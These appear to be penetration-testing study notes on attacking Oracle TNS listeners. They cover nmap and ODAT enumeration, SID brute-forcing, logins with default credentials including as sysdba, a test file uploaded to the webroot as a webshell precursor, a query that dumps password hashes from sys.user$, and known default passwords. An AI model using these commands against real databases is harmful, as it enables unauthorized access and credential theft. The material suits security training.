# Enumeration
```
nmap -p1521 -sV $IP --open

# Using ODAT (Oracle DB Attacking Tool)
sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete

./odat.py all -s $IP
```


# SID Bruteforcing
In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance.
It can have multiple instances, each with its own System ID.
We need SID to identify which database instance we want to connect to. If we specifies an incorrect SID, the connection attempt will fail.

```
nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```


# Interacting w/ service
```
# Connect to db using the found SID "XE"
sqlplus scott/tiger@$IP/XE

# Connect to db as sysdba (System DB Admin)
sqlplus scott/tiger@$IP/XE as sysdba
```

!!! If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared). !!!
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

# Uploading a webshell
This requires the server to run a web server, and we need to know the exact location of the root directory for the webserver.

Trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important.
```
echo "Oracle File Upload Test" > testing.txt

./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt

<SNIP...>

[+] The ./testing.txt file was created on the 

curl -X GET http://$IP/testing.txt

Oracle File Upload Test
```

# SQLplus Commands

[SQLplus commands cheatsheet](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)

|Commands|**Description**|
|---|---|
|`select table_name from all_tables;`|List all the available tables in the current database|
|`select * from user_role_privs;`|Show the privileges of the current user|
|`select name, password from sys.user**$**;`|Retrieve password hashes from the `sys.user$` user.|

# Dangerous Settings
```
# Conf file
The plain text configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory.
```

Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set.

The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one.

Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution.

Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|
